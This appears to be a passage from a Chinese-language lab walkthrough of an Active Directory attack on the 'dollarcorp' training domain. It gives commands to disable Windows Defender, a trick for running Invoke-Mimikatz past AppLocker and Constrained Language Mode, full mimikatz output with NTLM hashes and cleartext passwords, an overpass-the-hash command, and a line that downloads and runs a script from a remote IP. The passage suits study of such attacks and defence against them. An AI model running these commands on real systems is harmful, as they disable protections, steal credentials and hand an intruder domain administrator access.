+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+```
+
+
+从上面枚举的策略可以看到，只有```{%PROGRAMFILES%\*}```和```{%WINDIR%\*}```可以执行脚本
+
+但是因为Constrained Language Mode，CLM，就算能把脚本拷贝到靶机，我们也不能执行，因为dcorp-adminsrv有CLM
+
+什么是CLM?
+>约束语言模式（Constrained Language Mode，CLM）是限制PowerShell的一种方法，可以限制PowerShell访问类似 Add-Type 之类的功能或者许多反射（reflective）方法（攻击者可以通过这些方法，在后续渗透工具中利用PowerShell运行时作为攻击媒介
+
+那怎么办呢？
+
+###  关闭Windows Defender
+```
+[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
+VERBOSE: Performing operation 'Update MSFT_MpPreference' on Target 'ProtectionManagement'.
+```
+
+### script调用自己
+
+方法：
+1. 复制一份Invoke-Mimikatz.ps1，取名为：Invoke-Mimikatz2.ps1
+2. 在Invoke-Mimikatz2.ps1文件的最底部，加一行命令：Invoke-Mimikatz  #其实就是调用自己
+
+
+把修改好的脚本拷贝到dcorp-adminsrv，注意根据上面的Applocker策略，只可以放在Program Files文件夹
+```
+Copy-Item .\Invoke-Mimikatz2.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+```
+
+回到dcorp-adminsrv，已经可以看到拷贝过来的脚本
+```
+[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Program Files> ls
+
+
+    Directory: C:\Program Files
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        7/16/2016   6:18 AM                Common Files
+d-----        7/16/2016   6:18 AM                internet explorer
+d-----        8/20/2020   3:48 AM                Windows Defender
+d-----        7/16/2016   6:18 AM                WindowsPowerShell
+-a----        2/13/2022   6:39 AM        2530075 Invoke-Mimikatz2.ps1
+```
+
+执行Invoke-Mimikatz2，导出所有哈希
+```
+[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Program Files> .\Invoke-Mimikatz2.ps1
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 166214 (00000000:00028946)
+Session           : RemoteInteractive from 2
+User Name         : srvadmin
+Domain            : dcorp
+Logon Server      : DCORP-DC
+Logon Time        : 11/26/2020 8:43:30 AM
+SID               : S-1-5-21-1874506631-3219952063-538504511-1115
+        msv :
+         [00000003] Primary
+         * Username : srvadmin
+         * Domain   : dcorp
+         * NTLM     : a98e18228819e8eec3dfa33cb68b0728
+         * SHA1     : f613d1bede9a620ba16ae786e242d3027809c82a
+         * DPAPI    : ddce77eab64944efda38b5cfdad5395f
+        tspkg :
+        wdigest :
+         * Username : srvadmin
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : srvadmin
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 67126 (00000000:00010636)
+Session           : Service from 0
+User Name         : appadmin
+Domain            : dcorp
+Logon Server      : DCORP-DC
+Logon Time        : 11/26/2020 8:41:26 AM
+SID               : S-1-5-21-1874506631-3219952063-538504511-1117
+        msv :
+         [00000003] Primary
+         * Username : appadmin
+         * Domain   : dcorp
+         * NTLM     : d549831a955fee51a43c83efb3928fa7
+         * SHA1     : 07de541a289d45a577f68c512c304dfcbf9e4816
+         * DPAPI    : 7ec84538f109f73066103b9d1629f95e
+        tspkg :
+        wdigest :
+         * Username : appadmin
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : appadmin
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : *ActuallyTheWebServer1
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DCORP-ADMINSRV$
+Domain            : dcorp
+Logon Server      : (null)
+Logon Time        : 11/26/2020 8:41:23 AM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : DCORP-ADMINSRV$
+         * Domain   : dcorp
+         * NTLM     : 5e77978a734e3a7f3895fb0fdbda3b96
+         * SHA1     : e9f3e1343aff21e696b7b7ecc72286aa451c067f
+        tspkg :
+        wdigest :
+         * Username : DCORP-ADMINSRV$
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : dcorp-adminsrv$
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 21719 (00000000:000054d7)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 11/26/2020 8:41:22 AM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : DCORP-ADMINSRV$
+         * Domain   : dcorp
+         * NTLM     : 5e77978a734e3a7f3895fb0fdbda3b96
+         * SHA1     : e9f3e1343aff21e696b7b7ecc72286aa451c067f
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 66422 (00000000:00010376)
+Session           : Service from 0
+User Name         : websvc
+Domain            : dcorp
+Logon Server      : DCORP-DC
+Logon Time        : 11/26/2020 8:41:26 AM
+SID               : S-1-5-21-1874506631-3219952063-538504511-1113
+        msv :
+         [00000003] Primary
+         * Username : websvc
+         * Domain   : dcorp
+         * NTLM     : cc098f204c5887eaa8253e7c2749156f
+         * SHA1     : 36f2455c767ac9945fdc7cd276479a6a011e154b
+         * DPAPI    : 65e0a67c32db3788515ff56e9348e99c
+        tspkg :
+        wdigest :
+         * Username : websvc
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : websvc
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : AServicewhichIsNotM3@nttoBe
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 11/26/2020 8:41:23 AM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DCORP-ADMINSRV$
+Domain            : dcorp
+Logon Server      : (null)
+Logon Time        : 11/26/2020 8:41:22 AM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DCORP-ADMINSRV$
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : dcorp-adminsrv$
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+mimikatz(powershell) # exit
+Bye!
+```
+
+现在在dcorp-adminsrv机器上我们有了srvadmin的哈希，可以回到学习机器上使用Over pass the hash开启一个有域管理员权限的shell
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local  /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
+```
+
+
+Enter-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
+
+
+iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
+
+
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+
+Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
